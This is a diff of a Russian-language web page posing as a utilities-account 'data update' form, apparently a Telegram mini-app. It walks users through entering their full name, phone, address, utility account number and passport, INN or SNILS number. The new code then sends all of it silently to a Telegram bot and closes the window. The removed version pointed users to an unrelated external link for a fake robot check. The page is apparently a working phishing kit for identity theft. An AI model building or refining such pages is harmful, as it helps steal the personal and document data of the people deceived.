@@ -1,135 +1,263 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ЖКХ — обновление данных</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f5f5f5;
-      margin: 0;
-      padding: 20px;
-      text-align: center;
-    }
-    .card {
-      background: #fff;
-      border-radius: 12px;
-      padding: 20px;
-      max-width: 400px;
-      margin: auto;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
-    }
-    h2 { color: #1976d2; }
-    input, select, button {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-      font-size: 16px;
-    }
-    button {
-      background: #1976d2;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    button:hover { background: #0d47a1; }
-    .hidden { display: none; }
-  </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ЖКХ — обновление данных</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<style>
+  :root { --primary:#1976d2; --primary-dark:#0d47a1; --bg:#f5f7fb; --card:#fff; }
+  *{box-sizing:border-box}
+  body{margin:0;font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:var(--bg)}
+  .wrap{max-width:480px;margin:0 auto;padding:16px 16px 32px}
+  .card{background:var(--card);border-radius:16px;box-shadow:0 6px 18px rgba(0,0,0,.08);padding:20px}
+  h1{font-size:22px;margin:0 0 6px;text-align:center;color:var(--primary)}
+  p.sub{margin:0 0 16px;text-align:center;color:#667}
+  .progress{height:6px;background:#e7ecf5;border-radius:999px;overflow:hidden;margin:6px 0 16px}
+  .bar{height:100%;width:0;background:var(--primary);transition:width .25s ease}
+  .field{margin:10px 0}
+  label{display:block;margin:0 0 6px;color:#334}
+  input,select{width:100%;padding:12px 14px;border:1px solid #dbe1ea;border-radius:10px;font-size:16px}
+  .row{display:flex;gap:10px}
+  button{width:100%;padding:12px 14px;border:none;border-radius:12px;font-weight:600;font-size:16px;cursor:pointer}
+  .primary{background:var(--primary);color:#fff}
+  .primary:disabled{opacity:.5;cursor:not-allowed}
+  .ghost{background:#eef4ff;color:#274}
+  .hidden{display:none}
+  .help{margin-top:14px;font-size:14px;color:#667}
+  .footer{margin-top:16px;text-align:center;color:#889}
+  .ok{font-size:56px;margin:10px 0}
+</style>
 </head>
 <body>
-  <div class="card">
-    <h2>🏠 ЖКХ — обновление данных</h2>
+  <div class="wrap">
+    <div class="card">
+      <h1>🏠 ЖКХ — обновление данных</h1>
+      <p class="sub">Заполните шаги последовательно</p>
 
-    <div id="step1">
-      <p>Введите ФИО:</p>
-      <input type="text" id="fullname" placeholder="Фамилия Имя Отчество">
-      <button onclick="nextStep(1)">Далее</button>
+      <div class="progress"><div id="bar" class="bar"></div></div>
+
+      <!-- Шаг 1 -->
+      <section id="s1">
+        <div class="field">
+          <label>ФИО</label>
+          <input id="fullname" placeholder="Фамилия Имя Отчество" autocomplete="name">
+        </div>
+        <div class="row">
+          <button class="ghost" id="faq1">Частые вопросы</button>
+          <button class="primary" id="n1">Далее</button>
+        </div>
+      </section>
+
+      <!-- Шаг 2 -->
+      <section id="s2" class="hidden">
+        <div class="field">
+          <label>Телефон</label>
+          <input id="phone" placeholder="+7 999 123-45-67" inputmode="tel">
+        </div>
+        <div class="row">
+          <button class="ghost" id="b2">Назад</button>
+          <button class="primary" id="n2">Далее</button>
+        </div>
+      </section>
+
+      <!-- Шаг 3 -->
+      <section id="s3" class="hidden">
+        <div class="field">
+          <label>Адрес</label>
+          <input id="address" placeholder="Город, улица, дом, квартира" autocomplete="street-address">
+        </div>
+        <div class="row">
+          <button class="ghost" id="b3">Назад</button>
+          <button class="primary" id="n3">Далее</button>
+        </div>
+      </section>
+
+      <!-- Шаг 4 -->
+      <section id="s4" class="hidden">
+        <div class="field">
+          <label>Лицевой счёт</label>
+          <input id="account" placeholder="Например: 1234567890" inputmode="numeric">
+        </div>
+        <div class="row">
+          <button class="ghost" id="b4">Назад</button>
+          <button class="primary" id="n4">Далее</button>
+        </div>
+      </section>
+
+      <!-- Шаг 5 -->
+      <section id="s5" class="hidden">
+        <div class="field">
+          <label>Тип документа</label>
+          <select id="doctype">
+            <option value="Паспорт">📄 Паспорт</option>
+            <option value="ИНН">🧾 ИНН</option>
+            <option value="СНИЛС">🟢 СНИЛС</option>
+          </select>
+        </div>
+        <div class="row">
+          <button class="ghost" id="b5">Назад</button>
+          <button class="primary" id="n5">Далее</button>
+        </div>
+      </section>
+
+      <!-- Шаг 6 -->
+      <section id="s6" class="hidden">
+        <div class="field">
+          <label>Номер документа</label>
+          <input id="docnum" placeholder="4510 123456">
+        </div>
+        <div class="row">
+          <button class="ghost" id="b6">Назад</button>
+          <button class="primary" id="finish">Завершить</button>
+        </div>
+      </section>
+
+      <!-- Готово -->
+      <section id="done" class="hidden" style="text-align:center">
+        <div class="ok">✅</div>
+        <h2>Данные отправлены</h2>
+        <p class="help">Если вы в Telegram, окно закроется автоматически.</p>
+        <div class="footer">Спасибо!</div>
+      </section>
     </div>
 
-    <div id="step2" class="hidden">
-      <p>Введите телефон (+7...):</p>
-      <input type="text" id="phone" placeholder="+79991234567">
-      <button onclick="nextStep(2)">Далее</button>
-    </div>
-
-    <div id="step3" class="hidden">
-      <p>Введите адрес:</p>
-      <input type="text" id="address" placeholder="Город, улица, дом, квартира">
-      <button onclick="nextStep(3)">Далее</button>
-    </div>
-
-    <div id="step4" class="hidden">
-      <p>Введите лицевой счёт:</p>
-      <input type="text" id="account" placeholder="1234567890">
-      <button onclick="nextStep(4)">Далее</button>
-    </div>
-
-    <div id="step5" class="hidden">
-      <p>Выберите документ:</p>
-      <select id="doctype">
-        <option value="Паспорт">📄 Паспорт</option>
-        <option value="ИНН">🧾 ИНН</option>
-        <option value="СНИЛС">🟢 СНИЛС</option>
-      </select>
-      <button onclick="nextStep(5)">Далее</button>
-    </div>
-
-    <div id="step6" class="hidden">
-      <p>Введите номер документа:</p>
-      <input type="text" id="docnum" placeholder="4510 123456">
-      <button onclick="finish()">Завершить</button>
-    </div>
-
-    <div id="done" class="hidden">
-      <h3>✅ Спасибо!</h3>
-      <p>Данные сохранены. Подтвердите, что вы не робот:</p>
-      <button onclick="window.open('https://redirect.figma.site/', '_blank')">
-        Подтвердить
-      </button>
+    <div class="help">
+      Нужна помощь? <a href="https://t.me/" target="_blank" rel="noopener">Техподдержка</a>
     </div>
   </div>
 
-  <script>
-    function nextStep(step) {
-      if (step === 1) {
-        const fullname = document.getElementById("fullname").value.trim();
-        if (fullname.length < 5) { alert("Введите корректное ФИО"); return; }
-        showStep(2);
-      }
-      else if (step === 2) {
-        const phone = document.getElementById("phone").value.trim();
-        if (!phone.startsWith("+7") || phone.length < 11) { alert("Введите корректный номер"); return; }
-        showStep(3);
-      }
-      else if (step === 3) {
-        const address = document.getElementById("address").value.trim();
-        if (address.length < 5) { alert("Введите корректный адрес"); return; }
-        showStep(4);
-      }
-      else if (step === 4) {
-        const account = document.getElementById("account").value.trim();
-        if (account.length < 5) { alert("Введите корректный лицевой счёт"); return; }
-        showStep(5);
-      }
-      else if (step === 5) {
-        showStep(6);
-      }
-    }
+<script>
+(function(){
+  const tg = window.Telegram?.WebApp;
+  if (tg) {
+    tg.expand();
+    tg.MainButton.hide(); // всё управляем сами
+    tg.setHeaderColor("#ffffff");
+    tg.setBackgroundColor("#f5f7fb");
+  }
 
-    function finish() {
-      const docnum = document.getElementById("docnum").value.trim();
-      if (docnum.length < 5) { alert("Введите корректный номер документа"); return; }
-      showStep("done");
-    }
+  const steps = ["s1","s2","s3","s4","s5","s6","done"];
+  const data = JSON.parse(localStorage.getItem("jkh_form")||"{}");
+  const els = {
+    fullname: q("#fullname"),
+    phone:    q("#phone"),
+    address:  q("#address"),
+    account:  q("#account"),
+    doctype:  q("#doctype"),
+    docnum:   q("#docnum"),
+    bar:      q("#bar"),
+  };
 
-    function showStep(id) {
-      const steps = ["step1","step2","step3","step4","step5","step6","done"];
-      steps.forEach(s => document.getElementById(s).classList.add("hidden"));
-      document.getElementById(id).classList.remove("hidden");
-    }
-  </script>
+  // восстановление черновика
+  ["fullname","phone","address","account","doctype","docnum"].forEach(k=>{
+    if (data[k]) els[k].value = data[k];
+    els[k].addEventListener("input", saveDraft);
+  });
+
+  // навигация
+  on("#n1","click", ()=> validate1() && go(2));
+  on("#n2","click", ()=> validate2() && go(3));
+  on("#n3","click", ()=> validate3() && go(4));
+  on("#n4","click", ()=> validate4() && go(5));
+  on("#n5","click", ()=> go(6));
+  on("#finish","click", finish);
+
+  on("#b2","click", ()=> go(1));
+  on("#b3","click", ()=> go(2));
+  on("#b4","click", ()=> go(3));
+  on("#b5","click", ()=> go(4));
+  on("#b6","click", ()=> go(5));
+
+  on("#faq1","click", ()=> alert("Частые вопросы:\n• Зачем нужны данные? Для сверки лицевого счёта.\n• Можно заполнить позже? Да, черновик сохранится."));
+
+  // маска телефона по-минимуму
+  els.phone.addEventListener("blur", ()=>{
+    let v = els.phone.value.replace(/\s|-/g,"");
+    if (v && !v.startsWith("+7")) v = "+7"+v.replace(/^\+?8/,"");
+    els.phone.value = v;
+    saveDraft();
+  });
+
+  // стартовый шаг
+  go(Number(localStorage.getItem("jkh_step")) || 1);
+
+  function q(s){return document.querySelector(s)}
+  function on(s,e,cb){q(s).addEventListener(e,cb)}
+  function show(id){
+    steps.forEach(s=>q("#"+s).classList.add("hidden"));
+    q("#"+id).classList.remove("hidden");
+  }
+  function progress(step){
+    const pct = Math.min(100, Math.round(((step-1)/6)*100));
+    els.bar.style.width = pct + "%";
+  }
+  function go(step){
+    show("s"+step);
+    progress(step);
+    localStorage.setItem("jkh_step", String(step));
+  }
+  function saveDraft(){
+    const payload = {
+      fullname: els.fullname.value.trim(),
+      phone:    els.phone.value.trim(),
+      address:  els.address.value.trim(),
+      account:  els.account.value.trim(),
+      doctype:  els.doctype.value,
+      docnum:   els.docnum.value.trim(),
+    };
+    localStorage.setItem("jkh_form", JSON.stringify(payload));
+  }
+
+  // валидации
+  function validate1(){
+    if (els.fullname.value.trim().length < 5){ alert("Введите корректное ФИО"); return false; }
+    return true;
+  }
+  function validate2(){
+    const v = els.phone.value.trim();
+    if (!/^\+7\d{10}$/.test(v)){ alert("Телефон в формате +7XXXXXXXXXX"); return false; }
+    return true;
+  }
+  function validate3(){
+    if (els.address.value.trim().length < 5){ alert("Введите корректный адрес"); return false; }
+    return true;
+  }
+  function validate4(){
+    if (!/^\d{5,}$/.test(els.account.value.trim())){ alert("Лицевой счёт: минимум 5 цифр"); return false; }
+    return true;
+  }
+
+  // финал: отправляем в бота (тихо) и показываем «готово»
+  function finish(){
+    if (els.docnum.value.trim().length < 5){ alert("Введите корректный номер документа"); return; }
+
+    const payload = {
+      type: "jkh_form",
+      fullname: els.fullname.value.trim(),
+      phone: els.phone.value.trim(),
+      address: els.address.value.trim(),
+      account: els.account.value.trim(),
+      doctype: els.doctype.value,
+      docnum: els.docnum.value.trim(),
+      ts: new Date().toISOString()
+    };
+
+    // сохранить и отправить
+    localStorage.setItem("jkh_form", JSON.stringify(payload));
+    try {
+      if (tg?.sendData) {
+        tg.sendData(JSON.stringify(payload)); // отправится как web_app_data
+      }
+    } catch(e) { /* игнор */ }
+
+    show("done");
+    progress(7);
+    // очистить черновик через пару секунд и закрыть
+    setTimeout(()=>{ localStorage.removeItem("jkh_form"); localStorage.removeItem("jkh_step"); }, 1500);
+    if (tg?.close) setTimeout(()=>tg.close(), 1200);
+  }
+})();
+</script>
 </body>
 </html>
